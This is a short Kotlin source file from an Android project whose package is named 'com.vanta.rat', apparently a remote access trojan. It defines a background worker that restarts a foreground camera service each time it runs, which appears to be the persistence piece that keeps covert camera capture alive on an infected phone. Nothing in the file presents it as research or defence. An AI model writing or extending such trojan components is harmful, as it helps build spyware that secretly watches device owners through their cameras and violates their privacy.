package com.vanta.rat

import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters

class RestartWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        val intent = Intent(applicationContext, CameraService::class.java)
        ContextCompat.startForegroundService(applicationContext, intent)
        return Result.success()
    }
}
